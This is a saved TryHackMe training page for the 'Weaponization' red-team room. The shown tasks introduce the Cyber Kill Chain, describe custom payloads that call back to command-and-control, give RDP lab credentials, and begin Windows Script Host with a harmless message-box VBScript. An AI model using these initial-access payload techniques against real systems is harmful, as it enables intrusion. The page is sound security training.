<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Weaponization_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
<div class="modal-body">
<figure>
<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Weaponization_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Weaponization_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Weaponization_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/weaponization#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Weaponization_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Weaponization_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Weaponization_files/notifications.js"></script>
<script src="./TryHackMe _ Weaponization_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Weaponization_files/07dbc3d30ed9fe203980fa15046d29eb.png">
<div>
<div id="room-details">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">647</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Weaponization_files/6237ff0116023ea927d5f669af6d29bc.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Weaponization </h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/weaponization#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/weaponization#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/weaponization" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Weaponization_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">Understand and explore common red teaming weaponization techniques. You will learn to build custom payloads using common methods seen in the industry to get initial access.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/weaponization#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/weaponization#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/weaponization#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/weaponization#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/weaponization#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-medium">Medium</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/61b8bf81f831440043d2a200">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 20225 users are in here and this room is 580 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Weaponization_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3" id="table-machine-ip">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-success" role="progressbar" style="width: 100%; aria-valuemin=" 0"="" aria-valuemax="100"> 100%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem">In this room, we will be discussing<span style="box-sizing:border-box;font-size:1rem">&nbsp;</span><span style="box-sizing:border-box;font-size:1rem">different techniques used for weaponization.&nbsp;</span></p><p style="text-align:center;box-sizing:border-box;margin-top:0px;margin-bottom:1rem"><img src="./TryHackMe _ Weaponization_files/126ff098c0efeeeb8ab694a09b3359b0.png" alt="Cyber Kill Chain phases"><span style="box-sizing:border-box;font-size:1rem"><br></span></p><p style="text-align:center;box-sizing:border-box;margin-top:0px;margin-bottom:1rem"></p><p><span style="font-size:24px">What is Weaponization</span><br></p><div class="page-body"><p>Weaponization is the second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc. [<a href="https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html" target="_blank">1</a>]. The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.</p><p>
</p><p><span>Most organizations have Windows <a class="V95ZmTTN glossary-term" onclick="initPopOver(&#39;OS&#39;, &#39;V95ZmTTN&#39;)">OS</a> running, which is going to be a likely target. An organization's environment policy often blocks downloading and executing&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">.exe</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">f</span><span style="font-size:1rem">iles to avoid security violations. Therefore, red teamers rely upon building custom payloads sent via various channels such as phishing campaigns, social engineering, browser or software exploitation, USB, or web methods.</span></p><p>
</p><p>The following graph is an example of weaponization, where a crafted custom PDF or Microsoft Office document is used to deliver a malicious payload. The custom payload is configured to connect back to the command and control environment of the red team infrastructure.</p><p style="text-align:center"><img src="./TryHackMe _ Weaponization_files/734a353799fc9f3cd05bb7421ceedd00.png" style="width:821px;height:328.214px"></p><p>For more information about red team toolkits, please visit the following: a <a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development">GitHub repository</a> that has it all, including initial access, payload development, delivery methods, and others.  </p><p>
</p><p>Most organizations block or monitor the execution of&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">.exe</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:</span></p></div>

<ul><li>The Windows Script Host (WSH)</li><li><span>An HTML Application (<a class="DDqzXKuA glossary-term" onclick="initPopOver(&#39;HTA&#39;, &#39;DDqzXKuA&#39;)">HTA</a>)</span></li><li>Visual Basic Applications (VBA)</li><li><span><a class="IoiSyn40 glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;IoiSyn40&#39;)">PowerShell</a> (PSH)</span></li></ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Let's deploy the target machine in the next task, and we'll get started with the Windows Script Host technique in the subsequent task!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Deploy the Windows Machine
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="6176fd883b3e00004f4722f3" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p>In order to follow up along with the task content and apply what is given in this room, <u>you need to</u><u>&nbsp;start the attached machine by using the green Start Machine button in this task, and wait a few minutes for it to boot up.</u><span style="font-size:1rem"><span>&nbsp;To access the attached machine, you can either use the split in browser view or connect through the <a class="NPXWmAOT glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;NPXWmAOT&#39;)">RDP</a>.</span></span></p><p><span>If you prefer to connect through the Remote Desktop Protocol (<a class="vIytWrhI glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;vIytWrhI&#39;)">RDP</a>), first make sure you are connected to the VPN. Then an RDP client is required to connect to the attached Windows 10 machine. You can connect using the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">xfreerdp</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">tool, which is available on the TryHackMe AttackBox.</span></p><p><span style="font-size:1rem">To connect&nbsp; via&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">xfreerdp</span><span style="font-size:1rem">&nbsp;use the following command:</span></p>

<div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3 +clipboard</span></span></code>
</pre></div></div>

<p><span style="font-size:1rem">The username:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">thm</span><span style="font-size:1rem">&nbsp; and the&nbsp;</span><span style="font-size:1rem">password:&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:85%;padding:0.2em 0.4em">TryHackM3</span><span style="font-size:1rem">&nbsp;</span><br></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Deploy the attached Windows machine and connect to it via the RDP client. Once this is done, move to the next task.
                            </span></div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Windows Scripting Host - WSH
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="font-size:24px">Windows Scripting Host (WSH)</span></p><p>Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.</p><p>It is a Windows native engine, <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">cscript.exe</span>&nbsp;(for command-line scripts) and <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">wscript.exe</span>&nbsp;(for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">vbs</span>&nbsp;and <span style="font-family:&quot;SFMono-Regular&quot;, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135,131,120,0.15);color:#EB5757;border-radius:3px;font-size:85%;padding:0.2em 0.4em" class="notion-enable-hover">vbe</span>. For more information about VBScript, please visit <a href="https://en.wikipedia.org/wiki/VBScript" class="notion-link-token notion-enable-hover" target="_blank"><span style="border-bottom:0.05em solid;border-color:rgba(55,53,47,0.4);opacity:0.7" class="link-annotation-unknown-block-id-1715389817">here</span></a>. It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.</p><p>Now let's write a simple&nbsp;<span style="font-size:1rem">VBScript code&nbsp;</span><span style="font-size:1rem">to create a windows message box that shows the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Welcome to THM</span><span style="font-size:1rem">&nbsp;message. Make sure to save the following code into a file, for example,&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">hello.vbs</span><span style="font-size:1rem">.</span></p><pre style="font-size:16px"><pre style="font-size:12.25px" class=" language-javascript" tabindex="0"><code class=" language-javascript">Dim message 
message <span class="token operator">=</span> <span class="token string">"Welcome to THM"</span>
MsgBox message</code></pre></pre>

<p>In the first line, we declared the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">message</span><span style="font-size:1rem">&nbsp;variable using&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Dim</span><span style="font-size:1rem">.&nbsp;</span>Then we store a string value of&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Welcome to THM</span>&nbsp;in the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">message</span><span style="font-size:1rem">&nbsp;</span>variable. In the next line, we use the MsgBox function to show the content of the variable. For more information about the MsgBox function, please visit <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN" target="_blank">here</a>. Then, we use <span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">wscript</span><span style="font-size:1rem">&nbsp;to run and execute the content of&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">hello.vbs</span><span style="font-size:1rem">.</span><span style="font-size:1rem">&nbsp;As a result, A Windows message will pop up with&nbsp;</span><span style="font-size:1rem">the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">Welcome to THM</span><span style="font-size:1rem">&nbsp;message.</span></p>

